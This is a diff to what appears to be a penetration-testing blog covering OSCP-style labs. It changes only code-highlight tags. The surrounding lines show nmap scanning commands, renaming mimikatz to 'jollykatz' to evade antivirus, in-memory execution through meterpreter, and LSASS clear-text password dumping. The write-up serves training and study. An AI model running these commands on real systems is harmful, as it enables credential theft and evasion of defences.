@@ -72,19 +72,19 @@ Agreed, I was anticipating firewalls blocking ICMP. These are the commands I dec
 
 1. Start with a recon scan of the network to get an idea of the network:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -Pn -F -sSU -T5 -oX /root/10.1.1.1-254.xml 10.1.1.1-254 | grep -v 'filtered|closed' > /root/quick_recon.txt
 {% endhighlight %}
 
 2. Then force-scan all ports UDP + TCP per host (takes about 4 minutes per host on a LAN or roughly 17 hours for 254 hosts):
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -Pn -sSU -T4 -p1-65535 -oX /root/10.1.1.110.xml 10.1.1.110 | grep -v 'filtered|closed'
 {% endhighlight %}
 
 3. Then run an intensive scan on the open ports per host, TCP and UDP separately to speed scan up:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 # tcp:
 nmap -nvv -Pn -sSV -T1 -p$(cat 10.1.1.110.xml | grep portid | grep protocol=\\"tcp\\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -oX /root/10.1.1.110-intense-tcp.xml 10.1.1.110
 
@@ -480,7 +480,7 @@ So I received my VPN details to test the connection. I tested the connectivity a
 
 So out came nmap as per my methodology explained in my earlier post:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -Pn -F -sSU -T5 -oX /root/192.168.15.200-254.xml 192.168.15.200-254 | grep -v 'filtered|closed' > /root/quick_recon.txt
 {% endhighlight %}
 
@@ -722,7 +722,7 @@ Extract mimikatz-master.zip to C:\\jollykatz\\ (you should end up with C:\\jolly
 
 run the following in a cmd.exe to rename all files and folders to from "mimi" to "jolly":
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 powershell.exe -noprofile -command "1..10 | % {Get-ChildItem c:\\jollykatz\\ -Filter \\"*mimi*\\" -Recurse | Rename-Item -NewName {$_.name -replace 'mimi','jolly' }}"
 
 powershell.exe -noprofile -command "1..10 | % {Get-ChildItem c:\\jollykatz\\ -Filter \\"*kuhl*\\" -Recurse | Rename-Item -NewName {$_.name -replace 'kuhl','frog' }}"
@@ -805,13 +805,13 @@ NOTE: Hopefully, your antivirus won't pick up on the new jollykatz.exe files. If
 
 #### Run Mimikatz from memory through meterpreter (advisable):
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 execute -H -i -c -m -d calc.exe -f jollykatz.exe -a '"privilege::debug" "sekurlsa::logonPasswords full" "exit"'
 {% endhighlight %}
 
 #### How to use:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 -- dump clear-text passwords from LSASS process:
 C:\\> jollykatz32.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
 
@@ -985,19 +985,19 @@ The approach I used in the labs and in the exam was as follows:
 
 - Single host TCP scan:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -Pn -sS --stats-every 3m --max-retries 1 --max-scan-delay 20 --defeat-rst-ratelimit -T4 -p1-65535 -oA /root/192_168_15_201T 192.168.15.201
 {% endhighlight %}
 
 - Single host UDP scan:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oA /root/192_168_15_201U 192.168.15.201
 {% endhighlight %}
 
 - Detailed single host TCP scan:
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 nmap -nvv -Pn -sSV -T1 -p$(cat 192_168_15_201T.xml | grep portid | grep protocol=\\"tcp\\" | cut -d'"' -f4 | paste -sd "," -) --version-intensity 9 -A -oA /root/192_168_15_201T_DETAILED 192.168.15.201
 {% endhighlight %}
 
@@ -1019,7 +1019,7 @@ After having owned all machines in the exam, I went through the documentation an
 The screenshot has the following information, taken from a shell with root/system privileges:
 [proofs - Pastebin.com](http://pastebin.com/tQqfUvnk)
 
-{% highlight shell_session %}
+{% highlight ShellSession %}
 Linux:
 echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
 
